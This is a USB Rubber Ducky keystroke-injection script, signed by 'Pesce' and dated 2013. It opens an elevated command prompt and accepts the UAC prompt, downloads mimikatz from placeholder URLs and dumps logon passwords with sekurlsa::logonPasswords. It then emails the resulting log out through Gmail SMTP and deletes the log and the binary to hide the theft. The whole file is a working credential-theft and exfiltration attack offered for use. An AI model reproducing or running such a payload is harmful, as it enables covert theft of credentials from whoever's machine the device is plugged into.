REM Author: Pesce
REM Date: 10/20/2013
REM Note: Thanks to all the help everyone! This is my first attempt, don't be to upset!
REM -------------open command prompt with admin privileges
DELAY 3000
CONTROL ESCAPE
DELAY 1000
STRING cmd
DELAY 1000
CTRL-SHIFT ENTER
DELAY 1000
ALT y
ENTER
DELAY 300
REM -------------download appropriate mimikatz for architecture
STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('http://url to 32bit mimikatz.exe','%TEMP%\pw.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('http://url to 64bit mimikatz.exe','%TEMP%\pw.exe');}
ENTER
DELAY 5000
REM -------------get the passwords and save to c:\pwlog.txt
STRING %TEMP%\pw.exe > c:\pwlog.txt & type pwlog.txt;
ENTER
DELAY 2000
STRING privilege::debug
ENTER
DELAY 1000
STRING sekurlsa::logonPasswords full
ENTER
DELAY 1000
STRING exit
ENTER
DELAY 300
STRING del %TEMP%\pw.exe
ENTER
DELAY 300
REM -------------email log via gmail
STRING powershell
ENTER
DELAY 300
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('gmailuser', 'gmail password');
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'sending email account'
ENTER
STRING $ReportEmail.To.Add('email account to send report')
ENTER
STRING $ReportEmail.Subject = 'Duck Report'
ENTER
STRING $ReportEmail.Body = 'Attached is your duck report.' 
ENTER
STRING $ReportEmail.Attachments.Add('c:\pwlog.txt')
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 1000
STRING exit
ENTER
REM ---------------------delete and end
STRING del c:\pwlog.txt
ENTER
DELAY 300
STRING exit
ENTER
